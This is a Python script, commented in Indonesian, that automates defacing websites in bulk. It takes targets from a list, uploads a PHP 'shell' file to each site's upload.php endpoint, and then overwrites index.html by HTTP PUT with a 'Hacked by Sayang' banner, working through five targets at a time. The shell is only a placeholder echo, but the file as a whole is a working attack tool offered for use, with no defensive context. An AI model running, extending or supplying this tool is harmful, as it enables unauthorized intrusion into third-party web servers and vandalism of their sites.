import os
import requests
from concurrent.futures import ThreadPoolExecutor

# === CONFIG ===
SHELL_FILENAME = "shell.php"  # nama file shell yang akan diupload
SHELL_CONTENT = "<?php echo 'Uploader OK - ' . __FILE__; ?>"  # isi shell sederhana
DEFACE_FILENAME = "index.html"
DEFACE_CONTENT = "<h1>Hacked by Sayang ❤️</h1>"


def load_targets(file_path="targets.txt"):
    """Load target list from file"""
    if not os.path.exists(file_path):
        print(f"[!] File {file_path} tidak ditemukan.")
        return []
    with open(file_path, "r") as f:
        return [line.strip() for line in f if line.strip()]


def upload_shell(target):
    """Simulasi upload shell (POST multipart)"""
    url = target if target.startswith("http") else f"http://{target}"
    upload_url = f"{url}/upload.php"  # contoh endpoint upload

    files = {
        "file": (SHELL_FILENAME, SHELL_CONTENT, "application/x-php")
    }

    try:
        r = requests.post(upload_url, files=files, timeout=10)
        if r.status_code == 200:
            print(f"[+] {target} -> Shell uploaded")
            return True
        else:
            print(f"[-] {target} -> Upload gagal ({r.status_code})")
    except Exception as e:
        print(f"[!] {target} -> Error: {e}")
    return False


def auto_deface(target):
    """Auto deface setelah shell berhasil"""
    url = target if target.startswith("http") else f"http://{target}"
    deface_url = f"{url}/{DEFACE_FILENAME}"

    try:
        r = requests.put(deface_url, data=DEFACE_CONTENT, timeout=10)
        if r.status_code in [200, 201, 204]:
            print(f"[+] {target} -> Defaced at {deface_url}")
        else:
            print(f"[-] {target} -> Gagal deface ({r.status_code})")
    except Exception as e:
        print(f"[!] {target} -> Error deface: {e}")


def process_target(target):
    """Wrapper proses untuk 1 target"""
    if upload_shell(target):
        auto_deface(target)


def main():
    targets = load_targets()
    if not targets:
        print("[!] Tidak ada target untuk discan.")
        return

    print(f"[*] Mulai scan {len(targets)} target...\n")

    with ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(process_target, targets)


if __name__ == "__main__":
    main()
